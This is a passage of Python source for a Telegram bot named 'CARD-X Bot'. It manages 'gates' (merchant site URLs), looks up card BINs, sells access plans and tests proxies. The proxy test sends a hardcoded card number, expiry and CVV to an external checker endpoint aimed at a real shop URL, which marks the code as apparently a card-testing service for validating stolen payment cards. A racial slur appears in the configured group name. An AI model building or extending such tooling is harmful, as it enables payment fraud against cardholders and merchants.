            logger.info(f"✅ Custom gate '{gate_name}' added by user {user_id} -> {site_url}")
            return True
    except psycopg2.errors.UniqueViolation:
        logger.warning(f"⚠️ Gate name '{gate_name}' already exists.")
        return False
    except Exception as e:
        logger.error(f"❌ Database error in add_custom_gate: {e}")
        return False
    finally:
        connection_pool.putconn(conn)

# ==============================
# Get Custom Gate URL
# ==============================
def get_custom_gate_url(gate_name: str) -> Optional[str]:
    """
    Retrieve the site URL for a given custom gate command.
    
    Args:
        gate_name: The command name (e.g., 'sp')
        
    Returns:
        The site URL string or None if not found
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return None
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "SELECT site_url FROM custom_gates WHERE gate_name = %s",
                (gate_name,)
            )
            result = cur.fetchone()
            return result[0] if result else None
    except Exception as e:
        logger.error(f"❌ Database error in get_custom_gate_url: {e}")
        return None
    finally:
        connection_pool.putconn(conn)

# ==============================
# Is Custom Gate
# ==============================
def is_custom_gate(gate_name: str) -> bool:
    """Check if a command name is a registered custom gate."""
    return get_custom_gate_url(gate_name) is not None

# ==============================
# Delete Custom Gate
# ==============================
def delete_custom_gate(gate_name: str) -> bool:
    """
    Delete a custom gate from the database by name.
    
    Args:
        gate_name: The command name (e.g., 'sp')
        
    Returns:
        True if a row was deleted, False if not found
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "DELETE FROM custom_gates WHERE gate_name = %s",
                (gate_name,)
            )
            conn.commit()
            
            if cur.rowcount > 0:
                logger.info(f"✅ Deleted custom gate '{gate_name}'")
                return True
            else:
                return False
    except Exception as e:
        logger.error(f"❌ Database error in delete_custom_gate: {e}")
        return False
    finally:
        connection_pool.putconn(conn)

# ==============================
# Get All Gates
# ==============================
def get_all_gates() -> List[tuple]:
    """
    Get all custom gates from database.
    Required for /lisgates command.
    
    Returns:
        List of tuples: [(gate_name, site_url), ...]
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return []
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # We select BOTH gate_name AND site_url because the main script expects index 0 and 1
            cur.execute("SELECT gate_name, site_url FROM custom_gates")
            results = cur.fetchall()
            return results if results else []
    except Exception as e:
        logger.error(f"❌ Database error in get_all_gates: {e}")
        return []
    finally:
        connection_pool.putconn(conn)
# ==============================
# Update Custom Gate
# ==============================
def update_custom_gate(gate_name: str, site_url: str) -> bool:
    """
    Update the sites for an existing custom gate.
    
    Args:
        gate_name: The command name (e.g., 'sp')
        site_url: The new list of sites (comma-separated string)
        
    Returns:
        True if successful, False otherwise
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False

    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "UPDATE custom_gates SET site_url = %s WHERE gate_name = %s",
                (site_url, gate_name)
            )
            conn.commit()
            
            if cur.rowcount > 0:
                logger.info(f"✅ Updated custom gate '{gate_name}'")
                return True
            else:
                logger.warning(f"⚠️ Gate '{gate_name}' not found for update.")
                return False
    except Exception as e:
        logger.error(f"❌ Database error in update_custom_gate: {e}")
        return False
    finally:
        connection_pool.putconn(conn)



# ============================================================
# MODULE: bin
# ============================================================
# Updated URL
BINLIST_URL = "https://bins.antipublic.cc/bins/{}"

async def get_bin_info(bin_number: str) -> dict:
    """
    Fetch BIN information from the antipublic.cc API.
    """
    if not bin_number.isdigit() or len(bin_number) < 6:
        return {"error": "Invalid BIN. Must be at least 6 digits."}

    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(BINLIST_URL.format(bin_number)) as resp:
                if resp.status == 429:
                    return {"error": "Rate limit exceeded. Try again later."}
                if resp.status == 404:
                    return {"error": "BIN not found."}
                if resp.status != 200:
                    return {"error": f"API request failed (status {resp.status})"}

                data = await resp.json()

                # Note: The new API does not return a 'success' field in the JSON, 
                # so we skip the success check and proceed to map the data.

                return {
                    "bin": data.get("bin"),
                    "length": "N/A",  # Not provided by new API
                    "luhn": "N/A",    # Not provided by new API
                    "scheme": data.get("brand"),  # 'brand' in new API (e.g., VISA) maps to 'scheme'
                    "type": data.get("type"),
                    "brand": data.get("level"),   # 'level' in new API (e.g., CLASSIC) maps to 'brand'/category
                    "bank": data.get("bank"),
                    "bank_phone": "N/A", # Not provided by new API
                    "bank_url": "N/A",   # Not provided by new API
                    "country": data.get("country_name"),
                    "country_emoji": data.get("country_flag"),
                }
        except Exception as e:
            return {"error": f"Exception: {str(e)}"}



# ============================================================
# MODULE: forcejoin
# ============================================================
"""
Force Join Module
Enforces users to join specified group and channel before using bot commands.
"""


# --- Configuration ---
GROUP_ID = -1003518846194
GROUP_USERNAME = "stripenigga"

CHANNEL_ID = -1003518846194
CHANNEL_USERNAME = "stripenigga"

ADMIN_IDS = [7742548417]

FORCE_JOIN_IMAGE = "https://i.ibb.co/9kQbF5T3/5028670151544474400.jpg"

# Logger
logger = logging.getLogger("force_join")
logger.setLevel(logging.INFO)


# --- Helper: Safe membership check ---
async def safe_get_member(bot, chat_id: int, user_id: int):
    try:
        member = await bot.get_chat_member(chat_id, user_id)
        logger.info(f"[DEBUG] User {user_id} in {chat_id}: {member.status}")
        return member.status
    except Exception as e:
        logger.warning(
            f"[SAFE CHECK] Failed to get member {user_id} in {chat_id}: {e}"
        )
        return None


async def is_user_joined(bot, user_id: int) -> bool:
    valid_statuses = ("member", "administrator", "creator")

    group_status = await safe_get_member(bot, GROUP_ID, user_id)
    if group_status not in valid_statuses:
        logger.warning(f"User {user_id} NOT in group ({group_status})")
        return False

    channel_status = await safe_get_member(bot, CHANNEL_ID, user_id)
    if channel_status not in valid_statuses:
        logger.warning(f"User {user_id} NOT in channel ({channel_status})")
        return False

    logger.info(f"User {user_id} is in group & channel ✅")
    return True


# --- Force Join Decorator ---
def force_join(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):

        # ❗ Ignore updates without users (CRITICAL FIX)
        if not update.effective_user:
            return

        user_id = update.effective_user.id

        # Allow admins to bypass force join
        if user_id in ADMIN_IDS:
            return await func(update, context, *args, **kwargs)

        # Allow /start without checks
        if update.message and update.message.text:
            if update.message.text.startswith("/start"):
                return await func(update, context, *args, **kwargs)

        joined = await is_user_joined(context.bot, user_id)
        if not joined:

            keyboard = [
                [InlineKeyboardButton("📢 Join Group", url=f"https://t.me/{GROUP_USERNAME}")],
                [InlineKeyboardButton("📡 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME}")],
                [InlineKeyboardButton("✅ I have joined", callback_data="check_joined")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            caption_text = (
                "❌ 𝗨𝗻𝗹𝗼𝗰𝗸 𝗮𝗰𝗰𝗲𝘀𝘀 𝘁𝗼 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗯𝘆 𝗷𝗼𝗶𝗻𝗶𝗻𝗴 "
                "𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗮𝗻𝗱 𝗴𝗿𝗼𝘂𝗽 👇\n\n"
                "🔒 𝗔𝗹𝗹 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀 𝗮𝗿𝗲 𝗿𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗲𝗱.\n"
                "✅ 𝗝𝗼𝗶𝗻 𝗯𝗼𝘁𝗵 𝘁𝗼 𝘂𝗻𝗹𝗼𝗰𝗸."
            )

            # Safe target selection
            if update.message:
                target = update.message
            elif update.callback_query and update.callback_query.message:
                target = update.callback_query.message
            else:
                return

            await target.reply_photo(
                photo=FORCE_JOIN_IMAGE,
                caption=caption_text,
                reply_markup=reply_markup
            )
            return

        return await func(update, context, *args, **kwargs)

    return wrapper


# --- Callback Handler ---
async def check_joined_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query

    if not query or not query.from_user:
        return

    user_id = query.from_user.id
    logger.info(f"Callback triggered by user {user_id}")

    joined = await is_user_joined(context.bot, user_id)

    if joined:
        await query.answer(
            "✅ Access granted! You can now use the bot.",
            show_alert=True
        )
        try:
            await query.edit_message_caption(
                "✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲!\n\n"
                "🎉 You have successfully joined the group & channel.\n"
                "🚀 Enjoy using the bot!"
            )
        except Exception:
            pass
    else:
        await query.answer(
            "❌ You still need to join both!",
            show_alert=True
        )


__all__ = [
    "force_join",
    "check_joined_callback",
    "GROUP_ID",
    "GROUP_USERNAME",
    "CHANNEL_ID",
    "CHANNEL_USERNAME",
    "FORCE_JOIN_IMAGE",
]



# ============================================================
# MODULE: plans
# ============================================================
# Configure logging

# List of admin user IDs who can use plan commands
ADMIN_IDS = [7742548417]

# Chat ID to send purchase logs to
LOG_CHANNEL_ID = -1003838614236

# Plan configurations
PLANS = {
    "plan1": {
        "name": "𝑪𝒐𝒓𝒆 𝑨𝒄𝒄𝒆𝒔",
        "tier": "Core",
        "duration_days": 7,
        "emoji": "🛠️",
        "price": "$8.00"
    },
    "plan2": {
        "name": "𝑬𝒍𝒊𝒕𝒆 𝑨𝒄𝒄𝒆𝒔",
        "tier": "Elite",
        "duration_days": 15,
        "emoji": "👑",
        "price": "$14.00"
    },
    "plan3": {
        "name": "𝑹𝒐𝒐𝒕 𝑨𝒄𝒄𝒆𝒔",
        "tier": "Root",
        "duration_days": 30,
        "emoji": "⭐",
        "price": "$25.00"
    },
    "plan4": {
        "name": "𝑿-𝑨𝒄𝒄𝒆𝒔",
        "tier": "X",
        "duration_days": 90,
        "emoji": "💎",
        "price": "$60.00"
    }
}

def is_admin(user_id: int) -> bool:
    """Check if the user is an admin."""
    return user_id in ADMIN_IDS

def format_plan_response(success: bool, plan_name: str, user_id: int, 
                        user_name: str, tier: str, duration_days: int, 
                        emoji: str, error_msg: Optional[str] = None) -> str:
    """Format the plan response message."""
    if success:
        expiry_date = (datetime.now() + timedelta(days=duration_days)).strftime('%Y-%m-%d %H:%M:%S')
        return f"""
<pre><a href='https://t.me/rev3rsex'>✅</a> <b>Plan Updated Successfully</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>User</b> ↬ <a href='tg://user?id={user_id}'>{user_name}</a>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Plan</b> ↬ {emoji} {plan_name}
<a href='https://t.me/rev3rsex'>⊀</a> <b>Tier</b> ↬ <code>{tier}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Duration</b> ↬ <code>{duration_days} days</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Expires</b> ↬ <code>{expiry_date}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""
    else:
        return f"""
<pre><a href='https://t.me/rev3rsex'>❌</a> <b>Plan Update Failed</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Error</b> ↬ <code>{error_msg}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""

def format_plan_congratulations(user_id: int, user_name: str, plan_name: str, 
                              tier: str, duration_days: int, emoji: str) -> str:
    """Format the congratulations message for the user."""
    expiry_date = (datetime.now() + timedelta(days=duration_days)).strftime('%Y-%m-%d %H:%M:%S')
    return f"""
<pre><a href='https://t.me/rev3rsex'>🎉</a> <b>Congratulations! 🎉</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Your Plan Has Been Upgraded</b>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Plan</b> ↬ {emoji} {plan_name}
<a href='https://t.me/rev3rsex'>⊀</a> <b>Tier</b> ↬ <code>{tier}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Duration</b> ↬ <code>{duration_days} days</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Expires</b> ↬ <code>{expiry_date}</code>

<a href='https://t.me/rev3rsex'>ℭ</a> <b>Benefits:</b> <i>Unlimited credits until plan ends</i>
<a href='https://t.me/rev3rsex'>ℭ</a> <b>Access:</b> <i>No cooldowns on any commands</i>

<a href='https://t.me/rev3rsex'>⌬</a> <b>Thank you for choosing our service!</b>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""

def format_plan_revocation(user_name: str, plan_name: str, tier: str) -> str:
    """Format the plan revocation message for the user."""
    return f"""
<pre><a href='https://t.me/rev3rsex'>ℹ️</a> <b>Plan Status Update</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Hello {user_name},</b>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Your {plan_name} ({tier}) has been ended.</b>

<a href='https://t.me/rev3rsex'>ℭ</a> <b>Current Status:</b> <i>You have been reverted to Trial tier</i>
<a href='https://t.me/rev3rsex'>ℭ</a> <b>Credits:</b> <i>Your credits have been restored</i>

<a href='https://t.me/rev3rsex'>⌬</a> <b>Thank you for using our service!</b>
<a href='https://t.me/rev3rsex'>⌬</a> <b>If you'd like to renew your plan, please contact</b> <a href='https://t.me/rev3rsex'>@rev3rsex</a>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""

async def handle_plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE, plan_type: str):
    """Handle the plan commands."""
    # Check if user is admin
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(
            "<pre>⚠️ <b>Access Denied</b></pre>\n\n"
            "<i>You don't have permission to use this command.</i>",
            parse_mode="HTML"
        )
        return
    
    # Check if user ID was provided
    if not context.args:
        await update.message.reply_text(
            f"<pre>⚠️ <b>Missing User ID</b></pre>\n\n"
            f"<i>Usage: /{plan_type} user_id</i>",
            parse_mode="HTML"
        )
        return
    
    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text(
            "<pre>⚠️ <b>Invalid User ID</b></pre>\n\n"
            "<i>Please provide a valid numeric user ID.</i>",
            parse_mode="HTML"
        )
        return
    
    # Get plan details
    plan_info = PLANS.get(plan_type)
    if not plan_info:
        await update.message.reply_text(
            "<pre>⚠️ <b>Invalid Plan</b></pre>\n\n"
            "<i>This plan doesn't exist.</i>",
            parse_mode="HTML"
        )
        return
    
    # Get target user info
    try:
        target_user = await context.bot.get_chat(target_user_id)
        target_user_name = target_user.first_name or "Unknown"
    except Exception as e:
        logger.error(f"Error getting user info: {e}")
        target_user_name = "Unknown"
    
    # Check if user already has an active plan to determine if this is an upgrade
    current_tier = check_plan_expiry(target_user_id)
    is_upgrade = False
    
    if current_tier and current_tier != "Trial":
        is_upgrade = True

    # Calculate expiry date
    expiry_date = datetime.now() + timedelta(days=plan_info["duration_days"])
    
    # Update user plan in database
    success = update_user_plan(
        target_user_id, 
        plan_info["tier"], 
        expiry_date
    )
    
    # Send response to admin
    if success:
        response = format_plan_response(
            True, 
            plan_info["name"], 
            target_user_id, 
            target_user_name,
            plan_info["tier"],
            plan_info["duration_days"],
            plan_info["emoji"]
        )
        
        # 1. Send congratulations message to the user
        congrats_msg = format_plan_congratulations(
            target_user_id,
            target_user_name,
            plan_info["name"],
            plan_info["tier"],
            plan_info["duration_days"],
            plan_info["emoji"]
        )
        
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=congrats_msg,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Error sending congratulations message: {e}")

        # 2. Send Log Message to Channel
        try:
            # Generate 8-character alphanumeric suffix
            random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            
            # Mask the receipt ID: CARDX-XXXXXXX
            # Display format: CARDX-{First 2 chars}XXXX{Last 2 chars}
            # Example: CARDX-RJN4WKV1 -> CARDX-RJXXXXV1
            masked_suffix = f"{random_suffix[:2]}XXXX{random_suffix[-2:]}"
            receipt_id_display = f"CARDX-{masked_suffix}"
            
            # Determine Log Title based on whether it was an upgrade
            log_title = "Plan RENEWED 🔄" if is_upgrade else "New Plan Purchase 🛒"
            
            # Prepare compact log message (No Duration, No Tier, No spaces)
            log_msg = f"""<pre>{log_title}</pre>
<a href='https://t.me/rev3rsex'>⊀</a><b> User</b> ↬ <a href='tg://user?id={target_user_id}'>{target_user_name}</a>
<a href='https://t.me/rev3rsex'>⊀</a><b> Plan</b> ↬ {plan_info['emoji']}{plan_info['name']}
<a href='https://t.me/rev3rsex'>ℭ</a><b> Price</b> ↬ <code>{plan_info['price']}</code>
<a href='https://t.me/rev3rsex'>ℭ</a><b> Receipt</b> ↬ <code>{receipt_id_display}</code>
<a href='https://t.me/rev3rsex'>⌬</a><b> Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""
            await context.bot.send_message(
                chat_id=LOG_CHANNEL_ID,
                text=log_msg,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Failed to send log to channel {LOG_CHANNEL_ID}: {e}")

    else:
        response = format_plan_response(
            False, 
            plan_info["name"], 
            target_user_id, 
            target_user_name,
            plan_info["tier"],
            plan_info["duration_days"],
            plan_info["emoji"],
            "Failed to update plan in database"
        )
    
    await update.message.reply_text(response, parse_mode="HTML")


async def handle_planall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all users with an active plan and sends the result as a .txt file."""

    # Admin check
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(
            "<pre>⚠️ <b>Access Denied</b></pre>\n<i>You cannot use this command.</i>",
            parse_mode="HTML"
        )
        return

    plans = get_all_active_plans()

    if not plans:
        await update.message.reply_text(
            "<pre><a href='https://t.me/rev3rsex'>ℹ️</a> <b>No Active Plans Found</b></pre>",
            parse_mode="HTML"
        )
        return
    
    # Prepare content for the .txt file (Plain text format)
    file_content = f"ACTIVE PLANS LIST\n"
    file_content += f"Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    file_content += f"Total Active Users: {len(plans)}\n"
    file_content += "=" * 40 + "\n\n"

    for user_id, tier, expiry_date in plans:

        # Find plan name + emoji
        plan_name = "Unknown"
        emoji = "❔"
        for p in PLANS.values():
            if p["tier"] == tier:
                plan_name = p["name"]
                emoji = p["emoji"]
                break

        # Expiry
        expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")

        # Username
        try:
            u = await context.bot.get_chat(user_id)
            uname = u.first_name or "Unknown"
        except:
            uname = "Unknown"

        # Append to file content (Clean text format)
        file_content += f"User: {uname}\n"
        file_content += f"User ID: {user_id}\n"
        file_content += f"Plan: {emoji} {plan_name}\n"
        file_content += f"Tier: {tier}\n"
        file_content += f"Expires: {expiry_str}\n"
        file_content += "-" * 40 + "\n"

    file_content += "\nGenerated by CARD-X Bot"

    # Define a filename with timestamp
    filename = f"active_plans_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    # Write content to file
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(file_content)

        # Send the file
        with open(filename, "rb") as f:
            await update.message.reply_document(
                document=f,
                caption=f"<pre>📋 <b>Active Plans List</b></pre>\n<i>Total: {len(plans)} users</i>",
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Error sending planall file: {e}")
        await update.message.reply_text("Failed to generate the plans list.")
    finally:
        # Cleanup: Delete the file after sending
        if os.path.exists(filename):
            os.remove(filename)


async def handle_decreds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Decrease user's credits by a specified amount."""

    # Admin check
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(
            "<pre>⚠️ <b>Access Denied</b></pre>\n<i>You cannot use this command.</i>",
            parse_mode="HTML"
        )
        return

    # Validate args
    if len(context.args) < 2:
        await update.message.reply_text(
            "<pre>⚠️ <b>Missing Arguments</b></pre>\n"
            "<i>Usage: /decreds user_id amount</i>",
            parse_mode="HTML"
        )
        return

    # Extract arguments
    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text(
            "<pre>⚠️ <b>Invalid Arguments</b></pre>\n"
            "<i>User ID and amount must be numbers.</i>",
            parse_mode="HTML"
        )
        return

    if amount <= 0:
        await update.message.reply_text(
            "<pre>⚠️ <b>Invalid Amount</b></pre>\n"
            "<i>Amount must be greater than 0.</i>",
            parse_mode="HTML"
        )
        return

    # Get current user credits
    current_credits = get_user_credits(user_id)

    if current_credits is None:
        await update.message.reply_text(
            "<pre>⚠️ <b>User Not Found</b></pre>",
            parse_mode="HTML"
        )
        return

    if current_credits == float("inf"):
        await update.message.reply_text(
            "<pre>⚠️ <b>Cannot Deduct Credits</b></pre>\n"
            "<i>User has an active plan (Unlimited credits)</i>",
            parse_mode="HTML"
        )
        return

    # Update credits (subtract)
    success = update_user_credits(user_id, -amount)

    if not success:
        await update.message.reply_text(
            "<pre>❌ <b>Failed to Update Credits</b></pre>",
            parse_mode="HTML"
        )
        return

    updated = get_user_credits(user_id)

    # Fetch user's display name
    try:
        user = await context.bot.get_chat(user_id)
        uname = user.first_name or "Unknown"
    except:
        uname = "Unknown"

    response = f"""
<pre><a href='https://t.me/rev3rsex'>💰</a> <b>Credits Updated</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>User</b> ↬ <a href='tg://user?id={user_id}'>{uname}</a>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Credits Deducted</b> ↬ <code>-{amount}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>New Balance</b> ↬ <code>{updated}</code>

<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""

    await update.message.reply_text(response, parse_mode="HTML")


async def handle_revoke_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the plan revocation command."""
    # Check if user is admin
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(
            "<pre>⚠️ <b>Access Denied</b></pre>\n\n"
            "<i>You don't have permission to use this command.</i>",
            parse_mode="HTML"
        )
        return
    
    # Check if user ID was provided
    if not context.args:
        await update.message.reply_text(
            "<pre>⚠️ <b>Missing User ID</b></pre>\n\n"
            "<i>Usage: /rplan user_id</i>",
            parse_mode="HTML"
        )
        return
    
    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text(
            "<pre>⚠️ <b>Invalid User ID</b></pre>\n\n"
            "<i>Please provide a valid numeric user ID.</i>",
            parse_mode="HTML"
        )
        return
    
    # Get current plan info
    current_plan = get_user_plan(target_user_id)
    if not current_plan:
        await update.message.reply_text(
            "<pre>⚠️ <b>User Not Found</b></pre>\n\n"
            "<i>This user doesn't have any active plan.</i>",
            parse_mode="HTML"
        )
        return
    
    current_tier, _ = current_plan
    
    # Find the plan name based on tier
    plan_name = "Unknown"
    for plan_id, plan_info in PLANS.items():
        if plan_info["tier"] == current_tier:
            plan_name = plan_info["name"]
            break
    
    # Get target user info
    try:
        target_user = await context.bot.get_chat(target_user_id)
        target_user_name = target_user.first_name or "Unknown"
    except Exception as e:
        logger.error(f"Error getting user info: {e}")
        target_user_name = "Unknown"
    
    # Update user plan to Trial in database
    success = update_user_plan(target_user_id, "Trial", None)
    
    # Send response to admin
    if success:
        response = f"""
<pre><a href='https://t.me/rev3rsex'>✅</a> <b>Plan Revoked Successfully</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>User</b> ↬ <a href='tg://user?id={target_user_id}'>{target_user_name}</a>
<a href='https://t.me/rev3rsex'>⊀</a> <b>Previous Plan</b> ↬ {plan_name} ({current_tier})
<a href='https://t.me/rev3rsex'>⊀</a> <b>New Plan</b> ↬ <code>Trial</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""
        
        # Send revocation message to the user
        revoke_msg = format_plan_revocation(target_user_name, plan_name, current_tier)
        
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=revoke_msg,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Error sending revocation message: {e}")
    else:
        response = """
<pre><a href='https://t.me/rev3rsex'>❌</a> <b>Plan Revocation Failed</b></pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>Error</b> ↬ <code>Failed to update plan in database</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>Dev</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""
    
    await update.message.reply_text(response, parse_mode="HTML")

# Individual command handlers
async def handle_plan1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_plan_command(update, context, "plan1")

async def handle_plan2(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_plan_command(update, context, "plan2")

async def handle_plan3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_plan_command(update, context, "plan3")

async def handle_plan4(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_plan_command(update, context, "plan4")

async def handle_rplan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_revoke_plan(update, context)

def check_plan_expiry(user_id: int) -> Optional[str]:
    """
    Check if a user's plan has expired and update their tier if needed.
    
    Args:
        user_id: The user ID to check
        
    Returns:
        The user's current tier (after potential update) or None if not found
    """
    user_plan = get_user_plan(user_id)
    if not user_plan:
        return None
    
    tier, expiry_date = user_plan
    
    # Check if plan has expired
    if expiry_date and datetime.now() > expiry_date:
        # Update to Trial tier
        update_user_plan(user_id, "Trial", None)
        return "Trial"
    
    return tier

# Function to be called from other modules to check if a user has an active plan
def get_user_current_tier(user_id: int) -> str:
    """
    Get the user's current tier, checking for plan expiry.
    """
    if user_id in ADMIN_IDS:
        return "Owner"
    
    tier = check_plan_expiry(user_id)
    
    if tier is None:
        user_data = get_or_create_user(user_id, None)
        if user_data:
            _, _, tier, _ = user_data
    
    return tier or "Trial"



# ============================================================
# MODULE: proxy
# ============================================================
# Configure logging

# Test site for proxy testing - use Shopify endpoint
TEST_SITE = "https://xaeden.onrender.com/sh"

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

def auto_fix_proxy_format(raw_proxy: str) -> Optional[str]:
    """
    Auto-detects and corrects various proxy formats to 'http://user:pass@host:port'.
    Handles:
    - IP:Port:User:Pass
    - Domain:Port:User:Pass (Fixed to support this)
    - User:Pass@IP:Port
    - http://IP:Port (Transparent)
    - IP:Port (Transparent)
    - Protocols (http/https) and typos (hytp)
    - Colons in passwords
    
    Args:
        raw_proxy: Raw proxy string
        
    Returns:
        Normalized proxy string (http://user:pass@host:port) or None if invalid
    """
    if not raw_proxy:
        return None

    # 1. Clean the string
    p = raw_proxy.strip()
    
    # 2. Handle protocol typo
    if p.startswith('hytp://'):
        p = 'http://' + p[7:]
    
    # 3. Extract protocol if present
    protocol = "http"
    if p.startswith(('http://', 'https://')):
        parts = p.split('://', 1)
        protocol = parts[0] 
        core = parts[1]
    else:
        core = p

    # 4. Analyze the core structure (without protocol)
    
    # Case A: Contains '@' (Standard format)
    if '@' in core:
        # Split by last '@' to handle passwords that might contain '@'
        auth_part, host_port_part = core.rsplit('@', 1)
        
        # Validate host:port part
        if ':' in host_port_part:
            # It looks like user:pass@host:port
            return f"{protocol}://{auth_part}@{host_port_part}"
        else:
            # Invalid structure after @
            return None

    # Case B: No '@' (Could be Host:Port:User:Pass or Host:Port)
    parts = core.split(':')
    
    # Check if it looks like Host:Port:User:Pass
    # We check if there are at least 4 parts and the second part (port) is numeric
    if len(parts) >= 4 and parts[1].isdigit():
        # parts[0] = Host (IP or Domain), parts[1] = Port, parts[2] = User, parts[3:] = Pass
        host = parts[0]
        port = parts[1]
        user = parts[2]
        # Password might contain colons, so join the rest
        password = ':'.join(parts[3:])
        return f"{protocol}://{user}:{password}@{host}:{port}"
        
    # Check if it looks like Transparent Proxy (Host:Port)
    # We check if there are exactly 2 parts and the second part is numeric
    if len(parts) == 2 and parts[1].isdigit():
         return f"{protocol}://{parts[0]}:{parts[1]}"

    # If nothing matches
    return None

def normalize_proxy_format(proxy: str) -> str:
    """
    Wrapper for auto_fix_proxy_format to maintain compatibility with existing code.
    """
    # Attempt to fix the format
    fixed = auto_fix_proxy_format(proxy)
    if fixed:
        return fixed
    
    # Fallback to basic cleanup if auto-fix failed but we want to try anyway
    proxy = proxy.strip()
    if proxy.startswith('hytp://'):
        proxy = 'http://' + proxy[7:]
    if not proxy.startswith(('http://', 'https://')):
        return f"http://{proxy}"
    return proxy

async def test_proxy(proxy: str) -> Tuple[bool, str]:
    """
    Test if a proxy works by making a request through the Shopify endpoint.
    
    Args:
        proxy: Proxy string to test
        
    Returns:
        Tuple of (success, message)
    """
    normalized_proxy = normalize_proxy_format(proxy)
    
    proxy_for_api = normalized_proxy
    if proxy_for_api.startswith("http://"):
        proxy_for_api = proxy_for_api[7:]
    elif proxy_for_api.startswith("https://"):
        proxy_for_api = proxy_for_api[8:]
    
    test_card = "4910149950579116|03|28|106"
    test_url = f"{TEST_SITE}?cc={test_card}&url=https://naturallclub.com&proxy={proxy_for_api}"
    
    try:
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(test_url) as response:
                if response.status == 200:
                    try:
                        data = await response.json()
                        api_response = data.get("Response", "")
                        if api_response and "error" not in api_response.lower() and "timeout" not in api_response.lower() and "proxy" not in api_response.lower():
                            return True, f"Proxy working (Response: {api_response[:50]})"
                        else:
                            return False, f"Proxy dead: {api_response[:80]}"
                    except Exception:
                        text = await response.text()
                        if text and len(text) > 10:
                            return True, f"Proxy working (got response)"
                        return False, "Empty response"
                else:
                    return False, f"HTTP {response.status}"
    
    except asyncio.TimeoutError:
        return False, "Proxy timed out"
